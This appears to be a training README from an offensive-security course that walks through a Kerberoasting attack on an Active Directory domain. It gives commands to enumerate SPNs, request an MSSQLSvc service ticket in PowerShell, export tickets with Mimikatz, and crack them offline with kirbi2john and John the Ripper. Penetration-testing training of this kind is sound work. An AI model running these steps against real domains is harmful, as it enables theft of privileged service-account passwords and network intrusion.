- - -
Full Guide : [By Offsec Student Mentor](https://github.com/k4sth4/Service-Account-Attack)

## Service-Account-Attack 💥
- A service account is a “**non-human**” account that is used to run services or applications.
- Service accounts are **not administrative accounts**, or other “**human**” accounts, used interactively by administrators or other employees.
- Service accounts also often **have privileged access** to **computers**, **applications**, and **data**, which makes them **highly valuable to attackers**.

#### Extracting Service Account Passwords with Kerberoasting : 
Kerberoasting takes advantage of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs).

First we need to find the Service Principle names using [GetUserSPNs.ps1](https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1).
```
.\GetUserSPNs.ps1 
```

![Imgur](https://i.imgur.com/M66vC2h.png)

"We will go for **MSSQLSvc**."

#### We will go for Selected Service Account : 

```
Add-Type -AssemblyName System.IdentityModel 

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/x.y.com:1433" 
```

![Imgur](https://i.imgur.com/a8hEPo3.png)

#### Extract Service Tickets Using Mimikatz : 

```
.\mimikatz.exe 
privilege::debug 
kerberos::list /export 
```

![Imgur](https://i.imgur.com/gLXKzlg.png)
![Imgur](https://i.imgur.com/5zrPA1w.png)

We've successfully imported **.kirbi** files. 
Grab the MSSQL one, and download it to attacker machine.

#### Crack the Tickets : 
We gonna use [kirbi2john.py](https://github.com/nidem/kerberoast) to get john hash and crack it using john.

```python
python3 kirbi2john.py -o hash mssql.kirbi 
```

![Imgur](https://i.imgur.com/bjHcMwz.png)

Now the hash is in **john format**. We can try to crack it.

```sh
john hash --wordlist=/home/kali/Downloads/rockyou.txt 
john hash --show
```

![Imgur](https://i.imgur.com/mwgIDvl.png)

- - -



